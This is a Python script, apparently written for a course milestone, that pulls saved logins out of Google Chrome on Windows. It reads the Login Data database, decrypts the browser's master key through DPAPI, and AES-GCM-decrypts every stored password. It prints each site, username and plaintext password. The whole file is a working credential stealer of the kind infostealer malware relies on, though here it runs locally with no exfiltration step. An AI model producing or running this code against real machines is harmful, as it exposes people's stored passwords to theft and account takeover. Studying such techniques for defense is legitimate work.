import os # Grab path easier for files
import json # Grab the encryption key in keyPath
import sqlite3 # Connect to DB on computer
import base64 # json key encoded in base64 with DPAPI at front
import win32crypt # Decrypt the encrypted key
from Crypto.Cipher import AES # AES decryption of passwords using key

appdataPath = os.getenv("APPDATA") # C:\Users\USER\AppData\Roaming. Need to go back 1 directory
dbPath = appdataPath + r"\..\Local\Google\Chrome\User Data\Default\Login Data"
keyPath = appdataPath + r"\..\Local\Google\Chrome\User Data\Local State" # In json format. [os_crypt][encrypted_key]

print(f"\n============================================================================\n")
print(f"Database path = {dbPath}")
print(f"Key path = {keyPath}")
print(f"\n============================================================================\n")

# Connect to the DB, possible that having Chrome open will block this so if getting an error 
# saying that the DB is locked, kill Chrome
conn = sqlite3.connect(dbPath)
cursor = conn.cursor()

# Run SQL query and get the result from it
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
query = cursor.fetchall()
#query[entry][column]

with open(keyPath, 'r') as file:
    data = json.load(file)
    
    # Grab value from json file
    encryptionKey = data['os_crypt']['encrypted_key']
    #print(encryptionKey)
    
    # Decode from base64
    encryptionKey = base64.b64decode(encryptionKey)[5:]
    #print(encryptionKey)
    
    # Use DPAPI to decrypt key
    encryptionKey = win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]
    #print(f"Encryption key: {encryptionKey.hex()}")

print("\nExtracted table")
for entry in query:
    print("==================================================================================")
    print(f"Site: {entry[0]}")
    print(f"User: {entry[1]}")
    #print(f"Pass: {entry[2].hex()}")
    
    # M3 Below. AES decryption
    encryptedPass = entry[2]
    iv = encryptedPass[3:15] # Removes v10 prefix and gets the IV of 12 bytes for AES GCM mode
    #print(f"Encrypted pass: {encryptedPass.hex()}")
    encryptedPass = encryptedPass[15:] # Gets rid of v10 prefix and the IV
    
    # Decrypt based off documentation https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html
    cipher = AES.new(encryptionKey, AES.MODE_GCM, iv)
    plaintext = cipher.decrypt(encryptedPass)
    decryptedPass = plaintext[:-16].decode() 
    # ^^^ Remove 16 junk (really I just don't know their purpose) bytes from end of the decrypted message and make it not a byte string
    
    #decryptedPassword = win32crypt.CryptUnprotectData(entry[2], None, None, None, 0)
    #print(f"Encrypted pass: {encryptedPass.hex()}")
    #print(f"Plaintext: {plaintext}")
    print(f"Pass: {decryptedPass}")
 
print("==================================================================================")    
#print(f"test: {query[0][1]}")

conn.close()


# Print out SELECT statement and get key for this milestone

